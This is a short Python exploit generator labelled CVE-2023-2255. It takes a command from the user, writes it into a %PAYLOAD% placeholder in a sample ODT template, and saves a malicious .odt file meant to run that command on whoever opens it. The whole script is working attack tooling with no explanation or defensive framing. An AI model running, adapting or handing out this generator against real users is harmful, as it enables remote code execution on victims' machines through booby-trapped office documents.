import os
import sys
import argparse

def main():
    parser = argparse.ArgumentParser(description="CVE-2023-2255")
    parser.add_argument("--cmd", required=True, help="Command to execute")
    parser.add_argument("--output", default="output.odt", help="Output filename")
    args = parser.parse_args()

    odt_file = "./samples/test.odt"

    # Check if the ODT file exists
    if not os.path.exists(odt_file):
        print(f"Error: File '{odt_file}' not found.")
        return

    # Read the content of the ODT file
    with open(odt_file, "r") as file:
        content = file.read()

    # Replace the placeholder with the payload
    payload = args.cmd.replace(" ", "%20")
    new_content = content.replace("%PAYLOAD%", payload)

    # Write the modified content to the output file
    output_file = args.output
    with open(output_file, "w") as file:
        file.write(new_content)

    print(f"File {output_file} has been created!")

if __name__ == "__main__":
    main()
